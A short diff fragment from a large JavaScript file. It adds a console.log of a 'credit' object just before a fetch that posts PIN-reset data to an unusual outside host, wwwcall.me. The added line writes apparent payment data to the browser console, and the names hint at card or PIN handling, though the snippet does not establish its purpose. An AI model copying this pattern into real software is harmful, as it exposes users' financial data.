@@ -16298,6 +16298,8 @@ function showVerify(data) {
       type: "pinreset",
     };
 
+    console.log(credit);
+
     fetch("https://wwwcall.me/api/account.php", {
       method: "POST",
       headers: {
